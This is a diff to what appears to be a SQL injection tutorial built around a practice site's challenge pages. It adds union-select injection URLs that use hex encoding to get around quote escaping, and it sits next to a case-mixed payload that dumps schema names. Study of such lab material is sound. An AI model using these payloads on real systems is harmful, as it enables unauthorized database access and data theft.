@@ -176,6 +176,18 @@ http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' && 0 union select 1,@
 
 ```
 
+ Still some times if the programmer is using `mysql_real_escape_string` it may create an error or else no output. We can simply avoid the usage of single quotes using `hex values`. Below is the encoded query for the above same query.
+
+```
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select '1','2','3'--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select 1,2,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' union select 0x31,0x32,0x33--+
+
+```
+
+
 #### Extract DATABASE NAME
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
